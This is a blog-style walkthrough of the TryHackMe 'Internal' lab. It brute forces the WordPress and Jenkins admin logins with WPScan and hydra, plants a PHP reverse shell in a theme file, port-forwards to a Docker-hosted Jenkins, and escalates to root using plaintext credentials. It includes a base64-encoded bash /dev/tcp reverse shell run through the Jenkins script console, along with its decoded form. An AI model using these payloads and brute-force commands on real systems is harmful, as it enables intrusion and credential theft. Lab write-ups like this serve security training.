---
layout: post
title:  "Internal Walkthrough"
date:   2021-08-17 12:44:14 -0400
categories: boxwriteup
---

Internal is a free Try Hack Me box that tries to emulate an internal penetration test. 

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).

This one is a bit of a bender so let's do it.

***

# Nmap Scan & Enumeration
Adding the IP to our /etc/hosts file to resolve the DNS to internal.thm locally. 
```bash
┌──(root💀redfish)-[/home/raindayzz/TryHackMe/Internal2]
└─# cat /etc/hosts                                                                                                                                                                                                                      130 ⨯
127.0.0.1	localhost
127.0.1.1	redfish

internal.thm	10.10.56.197 


# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
### Nmap Scan
```bash

┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ nmap -sV -sC 10.10.56.197  -o init.nmap
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 18:06 EDT
Nmap scan report for 10.10.56.197
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp   open     http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3323/tcp filtered active-net
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.33 seconds
```
### Port 80 (HTTP)

Let's start with looking into port 80. It seems to be a default linux apache2 server page. Let's start some directory busting to see if we can find something. 
```┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ gobuster dir -u http://internal.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt -o gb80.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://internal.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/08/17 18:10:01 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/index.html           (Status: 200) [Size: 10918]                              
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]

```

Boom! Wordpress is huge and is a notablely vulnerable CMS. Let's use WPScan, a popular wordpress vulnerability scanner to see what the configurations & plugins look like. 

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ wpscan --url http://internal.thm/blog --enumerate u                                                          4 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.56.197]
[+] Started: Tue Aug 17 18:11:40 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug 17 18:11:48 2021
[+] Requests Done: 54
[+] Cached Requests: 7
[+] Data Sent: 13.998 KB
[+] Data Received: 472.771 KB
[+] Memory used: 160.75 MB
[+] Elapsed time: 00:00:08
```
### Cracking the Admin password
We see that WPScan gave us a user named admin and that XML-RPC seems to be enabled which will allow us to bruteforce some passwords. Let's see if we can crack the admin password. 

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.56.197]
[+] Started: Tue Aug 17 18:13:14 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:03 <======================================> (137 / 137) 100.00% Time: 00:00:03

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                          
Trying admin / ionela Time: 00:03:25 <                                      > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Aug 17 18:16:51 2021
[+] Requests Done: 4028
[+] Cached Requests: 35
[+] Data Sent: 2.037 MB
[+] Data Received: 2.311 MB
[+] Memory used: 258.996 MB
[+] Elapsed time: 00:03:37
                              
```

After a quick cup of coffee, we get some credentials to the admin password. Let's login and see what trouble we can create. 

***

# Remote Code Execution


![Pasted image 20210817181941.png](/assets/images/internal/wpadmin.png)

Let's see if we can exploit a pretty generic thing in the editor page to overwrite PHP code. Here is a pretty basic example on how to do so.  https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress

We will edit the 404.php under the wordpress theme here is a photo of the code before and we will inject our PHP reverse shell in the second picture.



![Pasted image 20210817183343.png](/assets/images/internal/before.png)



![Pasted image 20210817183412.png](/assets/images/internal/after.png)

Once we update the code, we will start a listener on our kali machine and curl the 404.php page and hopefully it executes our PHP code and we get a reverse shell. 


![Pasted image 20210817183648.png](/assets/images/internal/shell1.png)

Boom!

***
# WWW-Data User Priv Esc

As we get our shell, we find some plain text credentials for aubreanna in the /opt directory
```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ sudo nc -lnvp 53                                                                                                   1 ⨯
listening on [any] 53 ...
connect to [10.9.11.106] from (UNKNOWN) [10.10.169.52] 38918
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:15:07 up 28 min,  1 user,  load average: 0.01, 0.01, 0.11
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
aubreann pts/0    10.9.11.106      22:48    1:07   0.22s  0.01s /bin/bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
$ 
```
Let's see if we can SSH into this user's account.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ ssh aubreanna@internal.thm                                                                                                                                                                                         130 ⨯
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 18 23:17:47 UTC 2021

  System load:  0.0               Processes:              114
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 44%               IP address for eth0:    10.10.169.52
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 18 23:17:14 2021 from 10.9.11.106
aubreanna@internal:~$ ls -l
total 12
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
drwx------ 3 aubreanna aubreanna 4096 Aug  3  2020 snap
-rwx------ 1 aubreanna aubreanna   21 Aug  3  2020 user.txt
aubreanna@internal:~$ cat user.txt | cut -c 1-5
THM{i
``` 

We are in and have the user's flag! Let's try to get root.

(Disclaimer: This is where it gets a bit weird, gotta take two steps back to take one step further :P )

***
# Aubreanna User Priv Esc

We see a file named jenkins.txt in our home directory
```bash
aubreanna@internal:~$ pwd
/home/aubreanna
aubreanna@internal:~$ cat jenkins.txt 
Internal Jenkins service is running on 172.17.0.2:8080
```
This PEAKS my interest and let me tell you why... Earlier when I ran linpeas, I saw there were processes being run as ROOT from the jenkins-proxy

```bash
aubreanna@internal:~$ ps -aux | grep root | tail 
root       952  0.0  0.3 291448  7296 ?        Ssl  22:47   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       954  0.0  0.1  14768  2304 ttyS0    Ss+  22:47   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       959  0.0  0.0  13244  1944 tty1     Ss+  22:47   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root      1084  0.0  1.2 489804 26012 ?        Ss   22:47   0:00 /usr/sbin/apache2 -k start
root      1455  0.0  0.1 404800  3532 ?        Sl   22:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.17.0.2 -container-port 8080
root      1467  0.0  0.2   9364  4912 ?        Sl   22:47   0:00 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/7b979a7af7785217d1c5a58e7296fb7aaed912c61181af6d8467c062151e7fb2 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc
root      7951  0.0  0.0      0     0 ?        I    23:09   0:00 [kworker/u30:1]
root      7985  0.0  0.0      0     0 ?        I    23:15   0:00 [kworker/u30:0]
root      8123  0.0  0.3 107984  7152 ?        Ss   23:17   0:00 sshd: aubreanna [priv]
aubrean+  8263  0.0  0.0  13212  1080 pts/0    S+   23:22   0:00 grep --color=auto root
```

Okay, let's do some port forwarding. This can be a bit confusing but we are going to re-direct the traffic from the localhost over a port back to my attacker box. 

### Port Forwarding
```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ ssh -L 7000:localhost:8080 aubreanna@internal.thm                                                                130 ⨯
aubreanna@internal.thm's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 18 23:24:48 UTC 2021

  System load:  0.0               Processes:              109
  Usage of /:   63.7% of 8.79GB   Users logged in:        0
  Memory usage: 44%               IP address for eth0:    10.10.169.52
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 18 23:17:48 2021 from 10.9.11.106
aubreanna@internal:~$ 

```

Okay now if we visit our localhost on port 7000 we will be served the page that is being served on 8080 on our target, crazy right?



![Pasted image 20210818192605.png](/assets/images/internal/jenkinsb4.png)






After some deafult creds were tried, let's see if we can brute force it with hydra.. I fired up Burp Suite Proxy and tweaked the POST request.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 7000 http-post-form "/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-18 19:27:19
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://localhost:7000/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password
[7000][http-post-form] host: localhost   login: admin   password: spongebob
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-18 19:27:37
```

I was able to crack the admin password with hydra, rookie stuff.



![Pasted image 20210818192912.png](/assets/images/internal/jenkinsadmin.png)

Now that I am in. I'm going to try to grab a reverse shell with the /script and a common reverse shell injection command from HackTrickxyz

Here is a code snippit to use from hacktricks ( https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins) 

```jenkins
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

The echo command is base 64 encrypted, let's decrypt it and change it.

```bash
──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ echo -n "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi80MzQzIDA+JjEnCg==" | base64 -d
bash -c 'bash -i >& /dev/tcp/10.10.14.22/4343 0>&1'
```

Okay cool, let's change the IP & port to match our kali system and re-encrypt it. 

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ echo -n "bash -c 'bash -i >& /dev/tcp/10.9.11.106/135 0>&1'" | base64                                              1 ⨯
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjExLjEwNi8xMzUgMD4mMSc=
```

Book past it into our Jenkins /Script directory and let's get a shell.

```bash
┌──(raindayzz㉿redfish)-[~/TryHackMe/Internal2]
└─$ sudo nc -lnvp 135                                                                       1 ⨯
listening on [any] 135 ...
connect to [10.9.11.106] from (UNKNOWN) [10.10.169.52] 46480
bash: cannot set terminal process group (6): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@jenkins:/$ uname -a
uname -a
Linux jenkins 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 GNU/Linux
jenkins@jenkins:/$ whoami
whoami
jenkins
jenkins@jenkins:/$
```

Okay, we are not root like we expected. I am now in a Docker instance hence the uname command and jenkins user. Let's do some basic enumeration... 

In the opt directory we find a file called note.txt and it seems to supply us with plaintext credentials to root
```bash
jenkins@jenkins:/$ cd /opt
cd /opt
jenkins@jenkins:/opt$ ls -l
ls -l
total 4
-rw-r--r-- 1 root root 204 Aug  3  2020 note.txt
jenkins@jenkins:/opt$ cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
jenkins@jenkins:/opt$
```

Okay! Sweet we have root (at least we think, let's try it out)
```bash
aubreanna@internal:~$ whoami
aubreanna
aubreanna@internal:~$ uname -a
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
aubreanna@internal:~$ su root
Password: 
root@internal:/home/aubreanna# whoami
root
root@internal:/home/aubreanna# cat /root/root.txt | head -c 5
THM{d
root@internal:/home/aubreanna# 
```

Nice! We own the system and have root privs. Done!



